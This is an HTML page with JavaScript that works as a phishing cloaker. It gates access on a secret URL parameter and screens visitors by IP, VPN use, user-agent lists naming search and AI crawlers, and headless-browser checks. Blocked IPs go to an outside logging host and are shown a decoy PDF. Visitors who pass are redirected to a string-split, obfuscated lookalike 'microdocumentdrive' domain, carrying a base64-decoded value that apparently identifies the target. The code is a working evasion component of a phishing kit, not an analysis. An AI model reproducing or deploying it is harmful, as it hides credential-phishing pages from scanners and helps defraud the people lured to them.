<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloaking Example</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            color: #07090F;
            line-height: 1.42857143;
        }

        iframe {
            width: 100%;
            height: 100vh; /* Full height */
            border: none;
        }
    </style>
</head>
<body>
    <div id="content"></div>

    <script>
        const blacklistedWords = [
            
        'google', 'microsoft', 'crawl','python','curl',
        'Amazonbot','Applebot','Applebot-Extended','Bytespider',
        'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
        'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
        'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
        'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
        'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
        'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
        'img2dataset','omgili','omgilibot'];

    const allowedParamPattern = /^Sachiel\d$/; // Replace 'keyword' with your actual keywords
    // const allowedPara = /^[a-zA-Z0-9.+-]{1,64}@[a-zA-Z0-9.-]{1,255}\.[a-zA-Z]{2,6}$/;
    var checkCountry = false; // Set to true to enable country check
    var Country = "";

    function fetchIPInfo() {
        const urlParams = new URLSearchParams(window.location.search);
        const param = urlParams.get('SIKA'); // Replace 'Sku' with the actual parameter name
        // const para = urlParams.get('vop');
        // !allowedParamPattern.test(param)
        if (!allowedParamPattern.test(param)) {
            console.log('Invalid parameter. Redirecting to error page...');
            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    addBlacklistedIP(ip);
                    redirectToBlockedPage();

                })
                .catch(error => {
                    console.error('Error:', error);
                });
            return;
        }

        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
            .then(response => response.json())
            .then(data => {
                // Extract IP address and hostname from ipinfo response
                var ip = data.ip;
                var hostname = data.hostname || '';
                console.log('IP Address:', ip);
                console.log('Hostname:', hostname);

                // Check if hostname contains any blacklisted words
                if (blacklistedWords.some(word => hostname.includes(word))) {
                    console.log('Hostname contains a blacklisted word. Adding IP to blacklist...');
                    addBlacklistedIP(ip);
                    redirectToBlockedPage();
                } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
                    console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
                    // Add IP to blacklist database
                    addBlacklistedIP(ip);
                    redirectToBlockedPage();
                } else {
                    console.log('IP ' + ip + ' is not using a VPN and from the allowed country.');
                    // Check if IP is blacklisted
                    checkBlacklistedIP(ip);
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }
    function redirectToBlockedPage() {
        document.getElementById('content').innerHTML = `
            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
                This browser does not support PDFs. Please download the PDF to view it: 
                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
            </iframe>
        `;
    }

    function addBlacklistedIP(ip) {
        // Check if IP is already in the blacklist
        fetch('https://higplk.ooguy.com/yup/clap.php?ip=' + ip)
            .then(response => response.text())
            .then(data => {
                if (data !== 'blacklisted') {
                    fetch('https://higplk.ooguy.com/yup/clap.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: 'ip=' + ip
                    })
                    .then(response => response.text())
                    .then(data => {
                        console.log(data); // Log the response
                        // You can handle the response here (e.g., display a message to the user)
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        redirectToBlockedPage();
                    });
                } else {
                    console.log('IP ' + ip + ' is already in the blacklist.');
                    redirectToBlockedPage();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                redirectToBlockedPage();
            });
    }

    function checkBlacklistedIP(ip) {
        // Check if IP is already blacklisted in the database
        fetch('https://higplk.ooguy.com/yup/clap.php?ip=' + ip)
            .then(response => response.text())
            .then(data => {
                if (data === 'blacklisted') {
                    console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
                    addBlacklistedIP(ip);
                    // Redirect user to blocked page
                    redirectToBlockedPage();

                } else if (data === 'clean') {
                    console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
                    // Proceed with normal flow
                    loadContent(); 
                } else {
                    console.log('Error:', data);
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }


    const botUserAgents = [
            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
            'img2dataset', 'omgili', 'omgilibot'
        ];

        // Function to detect the User-Agent
        function detectUserAgent() {
            const userAgent = navigator.userAgent;
            return botUserAgents.some(bot => userAgent.includes(bot));
        }

        // Function to detect a specific query parameter
        function detectQueryParameter(paramName) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.has(paramName) ? urlParams.get(paramName) : null;
        }

        // Function to load content based on user agent and query parameter
        function loadContent() {
    const isBot = detectUserAgent();
    const paramValue = detectQueryParameter('Bd');

    if (isBot) {
        window.location.href = "block.html";
    } else if (paramValue) {
        const script = document.createElement('script');
        script.innerHTML = `
            function isHuman() {
                const userAgent = navigator.userAgent.toLowerCase();
                const botUserAgents = [
                    'Googlebot', 'Bingbot', 'Yahoo! Slurp', 'DuckDuckBot',
                    'Baiduspider', 'YandexBot', 'Sogou', 'Exabot', 'facebot',
                    'ia_archiver', 'python', 'curl', 'bot', 'spider', 'crawl'
                ];
                const isBot = botUserAgents.some(bot => userAgent.includes(bot));
                const headlessChecks = [
                    () => /HeadlessChrome/.test(userAgent),
                    () => navigator.webdriver,
                    () => window.outerWidth === 0 && window.outerHeight === 0,
                    () => navigator.languages === "" || navigator.plugins.length === 0
                ];
                const isHeadless = headlessChecks.some(check => check());
                return !isBot && !isHeadless;
            }

function verifyAndRedirect() {
    if (isHuman()) {
        function getQueryParameter(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        function isBase64(str) {
            try {
                return btoa(atob(str)) === str;
            } catch (err) {
                return false;
            }
        }

        const paramValue = getQueryParameter('EIP');
        let finalValue;

        if (paramValue && isBase64(paramValue)) {
            finalValue = atob(paramValue);
            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
        } else {
            finalValue = paramValue;
            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
        }
    } else {
        window.location.href = "File not found.html";
    }
}


            setTimeout(verifyAndRedirect, 1000);
        `;
        document.body.appendChild(script);
    } else {
        document.getElementById('content').innerHTML = `
            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
                This browser does not support PDFs. Please download the PDF to view it: 
                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
            </iframe>
        `;
    }
}
        fetchIPInfo();
    </script>
</body>
</html>
